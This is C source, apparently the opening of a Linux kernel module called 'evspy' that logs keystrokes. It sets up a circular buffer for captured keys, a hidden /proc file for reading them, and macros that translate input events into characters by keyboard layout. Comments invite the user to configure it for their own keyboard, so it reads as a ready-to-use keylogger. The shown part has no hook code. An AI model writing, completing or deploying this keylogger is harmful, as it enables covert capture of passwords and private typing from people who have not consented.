#include <linux/cred.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/stat.h>
#include <linux/string.h>
#include <asm/page.h>
#include "khashmap/khashmap.h"

#define EVS_NAME		"evspy"				// driver name
#define EVS_KLAY		EVS_KLAY_EN			// change this to your keyboard layout
#define EVS_TROLL		1					// clear this if you're a serious guy
#define EVS_BUFSIZE		PAGE_SIZE			// size of the circular buffer (4K)
#define EVS_PROCNAME	"driver/" EVS_NAME	// virtual file within /proc

#include "maps/maps.h"

#define MIN(x, y)	(x) < (y) ? (x) : (y)

/*
 * If pointer is at the end of buffer, put it at the beginning.
 * If not, simply add 1 to it.
 */
#define evs_incp(p)		\
({		\
	if ((p) == &buffer[EVS_BUFSIZE-1])		\
		(p) = buffer;		\
	else		\
		(p)++;		\
 	(p);		\
})

/*
 * Same as evs_incp but backwards
 */
#define evs_decp(p)		\
({		\
	if ((p) == buffer)		\
		(p) = &buffer[EVS_BUFSIZE-1];		\
	else		\
		(p)--;		\
 	(p);		\
})

/*
 * Insert character c where wrp is pointing and move it to the next char.
 * If rdp == wrp, increase rdp too.
 */
#define evs_insert(c)		\
({		\
	*wrp = (c);		\
	if (evs_incp(wrp) == rdp)		\
		evs_incp(rdp);		\
})

/*
 * Remove a character from the buffer
 */
#define evs_delete()		\
({		\
	if (wrp != rdp && evs_decp(wrp) == rdp)		\
		evs_decp(rdp);		\
})

/*
 * Is the c event code associated to any of the FX buttons?
 */
#define evs_isfX(c)			\
({		\
	((c) >= KEY_F1 && (c) <= KEY_F10) ||		\
	((c) == KEY_F11 || (c) == KEY_F12) ||		\
	((c) >= KEY_F13 && (c) <= KEY_F24);		\
})

/*
 * Returns the character associated with event code c when shift is pressed
 */
#define evs_shift(c)		\
({		\
	void *__vp;		\
	char __c = (c);		\
	if (map[c] >= 'a' && map[c] <= 'z') {		\
		__c = map[c] + ('A'-'a');		\
	} else {		\
		__vp = khm_get(shm, (c));		\
		if (__vp) __c = *(char *)__vp;		\
	}		\
	__c;		\
})

// Event values
#define	EVS_VAL_FREE		0
#define	EVS_VAL_PRESS		1
#define	EVS_VAL_HOLD		2
